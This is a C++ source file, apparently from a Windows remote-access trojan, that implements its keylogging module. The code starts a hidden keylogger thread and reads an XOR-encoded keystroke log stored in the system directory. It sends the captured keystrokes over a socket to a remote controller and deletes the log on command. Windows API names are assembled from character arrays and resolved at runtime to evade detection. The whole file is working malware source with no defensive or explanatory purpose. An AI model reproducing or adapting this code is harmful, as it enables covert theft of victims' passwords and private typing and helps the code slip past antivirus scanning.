
#include "../stdafx.h"
#include "../Declare.h"   //动态调用库函数
#include "KeyboardManager.h"
#include "keylog.h"
#pragma comment(lib, "Imm32.lib")
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;
BOOL KeyLog = FALSE;

HINSTANCE	CKeyboardManager::g_hInstance = NULL;

////////////////////////////////////////////////////////////////////////////////////////////////////////
CKeyboardManager::CKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	if (KeyLog==FALSE)
	{
		MyCreateThread(NULL, 0,(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
		KeyLog=TRUE;
	}
	sendStartKeyBoard();
	WaitForDialogOpen();
}

CKeyboardManager::~CKeyboardManager()
{
	
}

void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
		char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	    char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	    lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
		if (lpBuffer[0] == COMMAND_NEXT)
		{
			NotifyDialogIsOpen();
		}
		if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR)
		{
			TCHAR	strRecordFile[MAX_PATH];
			char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	        GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);
			pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));

			char BrmAP01[] = {'D','e','l','e','t','e','F','i','l','e','A','\0'};
			DeleteFileAT pDeleteFileA=(DeleteFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP01);
			plstrcatA(strRecordFile,keylog);
			pDeleteFileA(strRecordFile);
		}
	    char FBwWp25[] = {'S','l','e','e','p','\0'};
        SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp25);
		pSleep(1234);
		sendStartKeyBoard();
		sendOfflineRecord();
}


int CKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)true;
	
	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	LPBYTE	lpBuffer = (LPBYTE)pLocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	Gyfunction->my_memcpy(lpBuffer + 1, lpData, nSize);
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpBuffer);
	return nRet;	
}

int CKeyboardManager::sendOfflineRecord()
{
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	TCHAR	strRecordFile[MAX_PATH];
	char Mstvw01[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
	GetSystemDirectoryAT pGetSystemDirectoryA=(GetSystemDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Mstvw01);
	pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	char keylog[] = {'\\','o','u','r','l','o','g','.','d','a','t','\0'};
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	plstrcatA(strRecordFile, keylog);
	char HvnXs01[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),HvnXs01);
	HANDLE	hFile = pCreateFileA(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	char Wffkl06[] = {'R','e','a','d','F','i','l','e','\0'};
    ReadFileT pReadFile=(ReadFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl06);
	char Wffkl09[] = {'G','e','t','F','i','l','e','S','i','z','e','\0'};
	GetFileSizeT pGetFileSize=(GetFileSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl09);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = pGetFileSize(hFile, NULL);
		TCHAR *lpBuffer = new TCHAR[dwSize];
		pReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		// 解密
		for (unsigned int i = 0; i < (dwSize/sizeof(TCHAR)); i++)
			lpBuffer[i] ^= XOR_ENCODE_VALUE;
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete lpBuffer;
	}
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);
	return nRet;
	
}






